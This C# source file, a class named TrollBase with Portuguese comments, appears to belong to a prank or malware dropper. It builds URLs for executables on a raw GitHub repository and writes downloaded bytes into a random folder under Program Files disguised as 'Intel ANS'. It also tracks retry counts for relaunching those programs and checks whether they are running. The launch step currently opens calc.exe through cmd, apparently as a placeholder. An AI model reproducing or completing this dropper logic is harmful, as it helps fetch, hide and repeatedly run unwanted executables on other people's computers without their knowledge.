using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;

namespace vtb.Model
{
    public class TrollBase
    {
        public int Id { get; set; }

        /// <summary>
        /// Nome do programa
        /// </summary>
        public string Nome { get; set; }

        /// <summary>
        /// Nome do processo
        /// </summary>
        public string NomeExe { get; set; }

        /// <summary>
        /// Tempo para reabrir o processo
        /// </summary>
        public int RestartDelay { get; set; }

        /// <summary>
        /// Quantidade de vezes que o processo pode ser reaberto
        /// </summary>
        private int TentativaAtual { get; set; }

        /// <summary>
        /// Quantidade de vezes que o processo pode ser reaberto
        /// </summary>
        public int Tentativas { get; set; }

        /// <summary>
        /// Caminho do processo 
        /// </summary>
        public string CaminhoLocal { get; set; }

        /// <summary>
        /// Caminho do processo 
        /// </summary>
        public string UrlExe { 
            get {
                return "https://raw.githubusercontent.com/yuridiniz/PkgInstall/master/vtb/Exe/" + NomeExe;
            }
        }

        /// <summary>
        /// Cria um caminho aleatório para o exe
        /// </summary>
        private string GerarCaminho()
        {
            string appData = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
            appData += "\\Intel ANS\\" + Guid.NewGuid().ToString() + "\\";
            return CaminhoLocal = appData;
        }

        /// <summary>
        /// Grava um o exe em um caminho gerado aleatoriamente
        /// </summary>
        public string GravarExe(byte[] bytes, List<Email> _emailNotificacao)
        {
            var caminho = GerarCaminho();

            string[] pathParts = caminho.Split('\\');

            for (int i = 0; i < pathParts.Length; i++)
            {
                if (i > 0)
                {
                    pathParts[i] = Path.Combine(pathParts[i - 1], pathParts[i]);

                    if (!Directory.Exists(pathParts[i].Replace(":",":\\")))
                        Directory.CreateDirectory(pathParts[i].Replace(":", ":\\"));
                }
            }

            File.WriteAllBytes(caminho + NomeExe, bytes);

            return caminho;
        }

        /// <summary>
        /// Executa o exe
        /// </summary>
        public bool ExecutarExe()
        {
            try
            {
                if (TentativaAtual >= Tentativas)
                    return false;

                Process.Start(@"C:\Windows\system32\cmd.exe /K C:\Windows\system32\calc.exe");

                TentativaAtual++;

                return true;
            }
            catch(Exception)
            {
                return false;
            }
        }

        /// <summary>
        /// Verifica se exe está aberto
        /// </summary>
        public bool IsAberto()
        {
            return Process.GetProcessesByName(NomeExe.Replace(".exe","")).Length > 0;
        }
    }
}
